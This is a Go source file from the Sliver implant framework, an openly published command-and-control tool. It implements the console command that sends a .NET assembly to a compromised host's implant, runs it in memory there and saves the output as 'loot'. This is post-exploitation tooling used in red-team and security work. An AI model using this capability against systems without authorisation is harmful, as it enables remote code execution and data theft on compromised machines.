package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// ExecuteAssemblyCmd - Execute a .NET assembly in-memory
func ExecuteAssemblyCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	assemblyPath := ctx.Args.String("filepath")
	isDLL := false
	if filepath.Ext(assemblyPath) == ".dll" {
		isDLL = true
	}
	if isDLL {
		if ctx.Flags.String("class") == "" || ctx.Flags.String("method") == "" {
			con.PrintErrorf("Please provide a class name (namespace.class) and method\n")
			return
		}
	}
	assemblyBytes, err := ioutil.ReadFile(assemblyPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}

	assemblyArgs := ctx.Args.StringList("arguments")
	process := ctx.Flags.String("process")

	ctrl := make(chan bool)
	con.SpinUntil("Executing assembly ...", ctrl)
	execAssembly, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:   con.ActiveTarget.Request(ctx),
		IsDLL:     isDLL,
		Process:   process,
		Arguments: strings.Join(assemblyArgs, " "),
		Assembly:  assemblyBytes,
		Arch:      ctx.Flags.String("arch"),
		Method:    ctx.Flags.String("method"),
		ClassName: ctx.Flags.String("class"),
		AppDomain: ctx.Flags.String("app-domain"),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}
	hostname := getHostname(session, beacon)
	if execAssembly.Response != nil && execAssembly.Response.Async {
		con.AddBeaconCallback(execAssembly.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, execAssembly)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintExecuteAssembly(execAssembly, hostname, assemblyPath, ctx, con)
		})
		con.PrintAsyncResponse(execAssembly.Response)
	} else {
		PrintExecuteAssembly(execAssembly, hostname, assemblyPath, ctx, con)
	}
}

// PrintExecuteAssembly - Print the results of an assembly execution
func PrintExecuteAssembly(execAssembly *sliverpb.ExecuteAssembly, hostname string,
	assemblyPath string, ctx *grumble.Context, con *console.SliverConsoleClient) {

	if execAssembly.GetResponse().GetErr() != "" {
		con.PrintErrorf("Error: %s\n", execAssembly.GetResponse().GetErr())
		return
	}

	var outFilePath *os.File
	var err error
	if ctx.Flags.Bool("save") {
		outFile := filepath.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, hostname))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	con.PrintInfof("Assembly output:\n%s", string(execAssembly.GetOutput()))
	if outFilePath != nil {
		outFilePath.Write(execAssembly.GetOutput())
		con.PrintInfof("Output saved to %s\n", outFilePath.Name())
	}

	if ctx.Flags.Bool("loot") && 0 < len(execAssembly.GetOutput()) {
		name := fmt.Sprintf("[execute-assembly] %s", filepath.Base(assemblyPath))
		err = loot.AddLootFile(con.Rpc, name, "console.txt", execAssembly.GetOutput(), false)
		if err != nil {
			con.PrintErrorf("Failed to save output as loot: %s\n", err)
		} else {
			con.PrintInfof("Output saved as loot\n")
		}
	}
}

func getHostname(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.Hostname
	}
	if beacon != nil {
		return beacon.Hostname
	}
	return ""
}
